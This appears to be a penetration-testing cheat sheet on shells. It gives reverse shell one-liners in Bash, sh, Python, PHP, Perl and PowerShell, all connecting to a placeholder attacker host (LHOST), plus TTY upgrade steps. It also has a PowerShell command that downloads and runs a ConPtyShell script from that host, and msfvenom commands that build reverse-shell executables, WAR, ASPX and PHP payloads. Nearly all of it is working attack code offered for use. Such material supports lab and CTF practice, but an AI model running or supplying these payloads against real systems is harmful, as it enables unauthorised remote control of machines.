# Shells and terminal upgrades

[← Foothold quick reference](../02-foothold.md)

## Reverse shell one-liners (set `LHOST`/`LPORT` first)
```bash
# Listener
nc -lvnp 443           # or: rlwrap nc -lvnp 443   (arrow keys/history)

# Bash
bash -i >& /dev/tcp/LHOST/443 0>&1
# alternative when the first Bash form fails:
exec 5<>/dev/tcp/LHOST/443; cat <&5 | while read l; do $l 2>&5 >&5; done

# sh / busybox
/bin/sh -i >& /dev/tcp/LHOST/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("LHOST",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Powershell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
- Keep a local copy of the shell formats you use; `revshells.com` can help generate variants.
- If a shell never connects back, check outbound access and the listener address. Try a reachable port such as 80 or 443 and verify one connection. The same check applies to staging downloads.

## Stabilize a Linux TTY (do this immediately)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # target: or: script -qc /bin/bash /dev/null
# then:
export TERM=xterm
# Ctrl+Z backgrounds it
# kali
stty raw -echo; fg
# (press Enter twice). Now you have arrows, tab, Ctrl+C.
# size it right:
stty size            # note rows/cols
stty rows 50 cols 200   # target
```

## Fully-interactive Windows shell (ConPtyShell: the Windows `stty` trick)
Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
```bash
# kali: raw terminal, note size, then listen
stty raw -echo; (stty size)          # -> e.g. 50 200
nc -lvnp 443
```
```powershell
# target: from the dumb shell
IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
# kali afterwards: stty sane   (or: reset)
```

## msfvenom payloads
```bash
# Windows exe reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f exe -o rev.exe
# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=443 -f elf -o rev.elf
# War (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=L LPORT=443 -f war -o shell.war
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f aspx -o shell.aspx
# PHP (strip the leading comment / add <?php)
msfvenom -p php/reverse_php LHOST=L LPORT=443 -f raw -o shell.php
# DLL / MSI / shellcode-as-needed: -f dll | msi | raw
```
